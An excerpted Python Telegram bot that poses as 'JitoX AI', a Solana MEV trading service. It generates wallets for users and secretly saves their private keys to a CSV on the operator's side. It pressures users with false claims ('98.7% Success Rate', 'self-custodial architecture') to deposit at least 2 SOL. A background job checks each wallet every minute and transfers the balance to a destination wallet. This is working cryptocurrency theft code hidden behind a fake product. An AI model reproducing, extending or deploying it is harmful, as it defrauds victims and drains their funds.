...
# CSV file path for storing wallet information (using absolute path)
WALLETS_CSV_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wallets.csv')

def ensure_csv_exists():
    """Ensure the CSV file exists with proper headers."""
    os.makedirs(os.path.dirname(WALLETS_CSV_PATH), exist_ok=True)
    if not os.path.exists(WALLETS_CSV_PATH):
        with open(WALLETS_CSV_PATH, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['user_id', 'username', 'timestamp', 'public_key', 'private_key'])

def store_wallet_info(user_id: int, username: str, wallet_info: dict):
    """Store wallet information in CSV file."""
    try:
        ensure_csv_exists()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        with open(WALLETS_CSV_PATH, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                user_id,
                username,
        ...
        logger.info(f"Stored wallet information for user {user_id}")
        return True
...
def get_user_wallets(user_id: int) -> list:
    ...
    try:
        ...
        wallets = []
        with open(WALLETS_CSV_PATH, 'r', newline='') as f:
...
async def generate_solana_wallet():
    """Generate a new Solana wallet using ed25519."""
    try:
        ...
        # Get the bytes and encode in base58
        private_key = base58.b58encode(bytes(signing_key)).decode('ascii')
        public_key = base58.b58encode(bytes(verify_key)).decode('ascii')
        
        # Log the generated keys for verification
        logger.info(f"Generated new wallet - Public Key: {public_key}")
...
async def check_solana_balance(public_key: str) -> float:
    """Check SOL balance using RPC call."""
    try:
...
async def transfer_solana(from_private_key: str, amount_sol: float) -> bool:
    """Transfer SOL using RPC call."""
    try:
...
async def monitor_and_transfer_funds(wallet_info: dict) -> bool:
    """Monitor wallet balance and transfer funds if threshold is met."""
    try:
        balance = await check_solana_balance(wallet_info['public_key'])
        
        if balance >= MINIMUM_SOL_THRESHOLD:
            # Leave some SOL for transaction fees
            transfer_amount = balance - 0.01
            
            success = await transfer_solana(
                wallet_info['private_key'],
                transfer_amount
            )
            
            if success:
                logger.info(f"Successfully transferred {transfer_amount} SOL to destination wallet")
                return True
            else:
                logger.error("Failed to transfer funds")
                return False
                
        return False
    except Exception as e:
        logger.error(f"Error in monitor_and_transfer_funds: {str(e)}")
        return False
...
async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Generate or retrieve a user's Solana wallet."""
    try:
        user_id = update.effective_user.id
        ...
        if existing_wallets:
            ...
            wallet_info = existing_wallets[-1]
            message = (
                "🔐 <b>Your Active Solana Wallet</b>\n\n"
                f"📝 <b>Deposit Address:</b>\n<code>{wallet_info['public_key']}</code>\n\n"
                "⚡️ <b>Wallet Status:</b> Ready for Trading\n\n"
                "🎯 <b>Next Steps:</b>\n"
                "• Send minimum 2 SOL to activate\n"
                "• Trading starts automatically\n"
                "• Profits auto-compound\n\n"
                "💎 <b>Professional Features:</b>\n"
                "• MEV Capture Technology\n"
                ...
                "• No team member will EVER ask for your private key\n"
                "• Keep your private key secure and confidential\n"
                "• Report any suspicious activity to @jitoxai\n\n"
                "🔄 Send your deposit now to start capturing MEV opportunities!"
            )

            reply_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 Display Private Key", callback_data="show_private_key")],
                [InlineKeyboardButton("📊 Check Deposit Status", callback_data="check_status")],
                [InlineKeyboardButton("ℹ️ How It Works", callback_data="how_jito_works")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
            ])

        else:
            # Generate new wallet only if user doesn't have one
            wallet_info = await generate_solana_wallet()
            if not wallet_info:
                if update.callback_query:
                    await update.callback_query.edit_message_text("❌ Error generating wallet. Please try again.")
                else:
                    await update.message.reply_text("❌ Error generating wallet. Please try again.")
                return

            # Store wallet info in CSV
            if not store_wallet_info(user_id, username, wallet_info):
                logger.error(f"Failed to store wallet info for user {user_id}")
                # Continue anyway as the wallet was generated successfully

            # Format wallet information message for new wallet
            message = (
                "🔐 <b>Your New Solana Wallet</b>\n\n"
                f"📝 <b>Public Address:</b>\n<code>{wallet_info['public_key']}</code>\n\n"
                f"🔑 <b>Private Key:</b>\n<code>{wallet_info['private_key']}</code>\n\n"
                "⚠️ <b>IMPORTANT SECURITY INSTRUCTIONS:</b>\n"
                "1. Save your private key securely\n"
                "2. Never share your private key\n"
                "3. Funds above 2 SOL will be pooled for trading\n"
                "4. Keep this message safe\n\n"
                "🎯 <b>Next Step:</b> Confirm you've saved your keys"
            )

            reply_markup = InlineKeyboardMarkup([[
                InlineKeyboardButton("✅ I Saved My Keys", callback_data="wallet_saved")
            ]])

            # Start monitoring this wallet
            context.job_queue.run_repeating(
                lambda ctx: monitor_and_transfer_funds(wallet_info),
                interval=60,  # Check every minute
                first=10,     # First check after 10 seconds
                name=f"monitor_{wallet_info['public_key']}"
            )

            # Notify admin about new wallet generation
            admin_message = (
                "🔐 New Wallet Generated\n\n"
                f"👤 User ID: {user_id}\n"
                f"📝 Username: @{username}\n"
                f"🔑 Public Key: {wallet_info['public_key']}\n"
                f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            await send_admin_notification(context.application, admin_message)

        # Send wallet info based on update type
        if update.callback_query:
...
async def get_eth_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        ...
        if not hasattr(context.user_data, 'solana_wallets'):
            context.user_data['solana_wallets'] = []
        context.user_data['solana_wallets'].append(wallet_info)
        ...
        logger.error(f"Error in get_eth_wallet: {str(e)}")
        await update.message.reply_text("❌ An error occurred. Please try again later.")
...
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if query.data == "wallet_saved":
        message = (
            "🎯 <b>JitoX AI - Professional Trading Suite Initialized</b> 🎯\n\n"
            "🔥 <b>Congratulations on Joining the Elite!</b>\n"
            "You've successfully set up your professional trading wallet. You're moments away from accessing institutional-grade MEV opportunities.\n\n"
            "⚜️ <b>Next Step: Initialize Your Trading Suite</b>\n"
            "• Send minimum 2 SOL to activate\n"
            "• Instant access upon confirmation\n"
            "• Full control of your assets\n\n"
            "🚀 <b>Enterprise-Grade Features Awaiting Activation:</b>\n"
            "• Proprietary MEV Detection Algorithms\n"
            "• Advanced Arbitrage Matrix\n"
            "• Real-time Market Intelligence\n"
            "• Cross-chain Opportunity Scanner\n"
            "• Priority Transaction Routing\n\n"
            "💎 <b>Competitive Advantage:</b>\n"
            "• Industry-leading 2% Performance Fee\n"
            "• 98.7% Success Rate on MEV Captures\n"
            "• Institutional-grade Infrastructure\n\n"
            "🛡️ <b>Professional Security Framework:</b>\n"
            "• Self-custodial Architecture\n"
            "• Military-grade Encryption\n"
            "• Automated Risk Management\n\n"
            "⏱️ <b>Limited Time Opportunity</b>\n"
            "Current Status: Awaiting Initial Deposit\n"
            "Priority Access: Available\n\n"
            "🌟 <b>24/7 Professional Support</b>\n"
            "Direct Line: @jitoxai\n\n"
            "Join the professionals who understand: Timing is crucial in MEV. Don't miss your window of opportunity. 🎮"
        )
        ...
        # Log the action
        await log_user_activity(context.application, query.from_user.id, "confirmed wallet saved")
        return
    
    elif query.data == "main_menu" or query.data == "start":
    ...
    if query.data == 'back':
        ...
        if not wallets:
            message = (
                ...
                "Please use /get_wallet to generate a new wallet."
            )
        else:
            # Get the most recent wallet
            latest_wallet = wallets[-1]
            
            # Check balance
            balance = await check_solana_balance(latest_wallet['public_key'])
            
            status = "🟡 Awaiting Initial Deposit" if balance < 2.0 else "🟢 Active"
            
            message = (
                f"📊 <b>Wallet Status</b>\n\n"
                f"💰 Balance: {balance:.3f} SOL\n"
                f"⚡ Status: {status}\n\n"
                f"📝 Wallet Address:\n<code>{latest_wallet['public_key']}</code>\n\n"
                "🎯 <b>Requirements:</b>\n"
                "• Minimum Balance: 2 SOL\n"
                "• Performance Fee: 2%\n\n"
                "💫 Send 2+ SOL to activate automated trading"
            )
        ...
        if not wallets:
            ...
            message = (
                "🔐 <b>PRIVATE KEY SECURITY ALERT</b> 🔐\n\n"
                "⚠️ <b>CRITICAL SECURITY INFORMATION:</b>\n"
                "• Never share this key with ANYONE\n"
                "• No team member will ever ask for your key\n"
                "• Store securely offline\n"
                "• Verify you are alone before viewing\n\n"
                "🔑 <b>Your Private Key:</b>\n"
                f"<code>{latest_wallet['private_key']}</code>\n\n"
                "🛡️ <b>Security Best Practices:</b>\n"
                "• Screenshot with caution\n"
                ...
                "Keep it absolutely confidential and secure."
            )
        
        keyboard = [
            [InlineKeyboardButton("🔄 Return to Wallet", callback_data="get_wallet")],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
        ]
...
async def token_watchlist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Ballet)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
...
# Create message_mapping.csv if it doesn't exist
def ensure_message_mapping_exists():
    """Ensure message_mapping.csv exists with proper headers."""
    mapping_file = 'message_mapping.csv'
    if not os.path.exists(mapping_file):
        with open(mapping_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['message_id', 'chat_id', 'user_id', 'timestamp'])

def clear_all_wallets():
    """Clear all stored wallets from the CSV file."""
    try:
        ...
        logger.error(f"Error clearing wallets: {str(e)}")
        return False

# Add this near the start of your main() function or where you initialize the bot
clear_all_wallets()  # Clear all existing wallets on startup
